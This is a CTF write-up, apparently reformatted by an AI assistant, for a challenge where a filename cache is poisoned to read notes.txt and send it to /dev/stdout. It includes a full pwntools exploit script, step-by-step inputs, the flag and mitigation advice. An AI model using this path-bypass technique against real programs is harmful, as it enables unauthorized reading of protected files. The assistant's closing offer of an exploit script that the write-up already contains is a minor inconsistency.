Certainly. Here's the cleaned-up version of the **Data Exfiltration System** CTF writeup with all emojis removed:

---

# Data Exfiltration System - Writeup

---

## Overview

In this CTF task, we exploit a logic flaw in a file-handling program to exfiltrate the contents of `notes.txt` by poisoning a file cache and redirecting writes to `/dev/stdout`. No memory corruption is needed—just creative abuse of how filenames are cached and reused.

---

## Binary Info

```bash
$ file main
main: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

```bash
$ pwn checksec main
[*] '/home/dexter/Desktop/DataExfiltrationSystem/main'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    Stripped: No
```

---

## Reverse Engineering

### Key Global Variables

* `FILE *open_market_file` — the current file opened for appending.
* `char *recently_closed[10]` — stores recently closed file names.
* `int recent_count` — used as an index to cycle through the cache.
* `char *open_market_name` — string of the open file's name.

### File I/O Logic

The program allows:

* Opening a file in the `markets/` directory, or directly if it was "recently closed".
* Appending a file from `hacked/`, or directly if it's "recent".
* Closing a file and storing its name in `recently_closed[]`.

### Cache Bypass

When a filename appears in `recently_closed`, the program skips all directory prefix checks and directly passes the string to `fopen()`.

---

## Vulnerability Summary

The program is vulnerable to a pointer poisoning logic flaw:

* You can close a file under a fake name, and the program will store that name as “recent”.
* The next time you open or append a file, it uses the raw string if it’s “recent”, skipping safety checks.

This allows us to:

* Read `notes.txt`
* Write to `/dev/stdout`

---

## Exfiltration Strategy (Pointer Poisoning)

We poison the internal cache so that the append operation reads from `notes.txt` and writes to `/dev/stdout`, which is the program's output (our socket).

---
## Exploit Script 
```Python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()


def open_file(name):
    io.sendlineafter(b'> ', b'3')  # Menu: Open market file
    io.sendlineafter(b'Enter market name to open its file: ', name.encode())
    io.recvuntil(b'Opened')  # Wait for success message

def close_file(name, fd):
    io.sendlineafter(b'> ', b'5')  # Menu: Close file
    io.sendlineafter(b'Enter file name to close: ', name.encode())
    io.sendlineafter(b'Enter file descriptor: ', str(fd).encode())
    io.recvuntil(b'Closed file.')

def append_hacked(name):
    io.sendlineafter(b'> ', b'4')  # Menu: Append hacked file
    io.sendlineafter(b'Enter hacked file name to append: ', name.encode())

# === Step 1: Open legit file to get valid FD ===
open_file("covenant_core")  # This gives fd 3 most likely

# === Step 2: Poison cache with "notes.txt" ===
close_file("notes.txt", 3)

# === Step 3: Reopen to get same FD ===
open_file("covenant_core")

# === Step 4: Poison cache with "/dev/stdout" ===
close_file("/dev/stdout", 3)

# === Step 5: Open "/dev/stdout" via fast cache ===
open_file("/dev/stdout")

# === Step 6: Append notes.txt to it ===
append_hacked("notes.txt")

# You should now see the content of notes.txt dumped to your screen

# Keep the connection open to read the data
io.interactive()


```

---

### Step-by-Step Exploit

Assume a legit market file named `covenant_core` exists.

#### 1. Open `covenant_core`

```bash
> 3
Enter market name to open its file: covenant_core
Opened covenant_core at fd 3 for appending.
```

#### 2. Poison cache with `notes.txt`

```bash
> 5
Enter file name to close:     notes.txt
Enter file descriptor:        3
Closed file.
```

Now `recently_closed[0] = strdup("notes.txt")`

#### 3. Reopen `covenant_core` to get a new file descriptor

```bash
> 3
Enter market name to open its file: covenant_core
Opened covenant_core at fd 3 for appending.
```

#### 4. Poison cache with `/dev/stdout`

```bash
> 5
Enter file name to close:     /dev/stdout
Enter file descriptor:        3
Closed file.
```

Now `recently_closed[1] = strdup("/dev/stdout")`

#### 5. Open `/dev/stdout` as a market file

```bash
> 3
Enter market name to open its file: /dev/stdout
Fast open via cache!
Opened /dev/stdout at fd 3 for appending.
```

#### 6. Append `notes.txt` as a hacked file

```bash
> 4
Enter hacked file name to append: notes.txt
Fast open via cache!
```

The program will now:

* Open `notes.txt` for reading
* `fgets()` each line
* `fputs()` them into `open_market_file`, which is `/dev/stdout`

The contents of `notes.txt` are printed directly to your screen or socket.

---

## Why This Works

* The first cache entry (`notes.txt`) lets us bypass the `hacked/` directory restriction.
* The second cache entry (`/dev/stdout`) redirects output to your terminal.
* This all works within the intended menu flow, without triggering memory corruption defenses.

---

## Example Output

```bash
> 3
Enter market name to open its file: /dev/stdout
Fast open via cache!
Opened /dev/stdout at fd 3 for appending.

> 4
Enter hacked file name to append: notes.txt
Fast open via cache!
[contents of notes.txt appear here]
```

---

## Flag

```
RedPointer{r00tP@ssw0rd}
```

---

## Mitigation Suggestions

* Sanitize paths even when they are from a cache.
* Forbid filenames with `/`, absolute paths, or devices like `/dev/stdout`.
* Normalize and validate all paths before use.

---

Let me know if you’d like a Python exploit script or test automation for this.
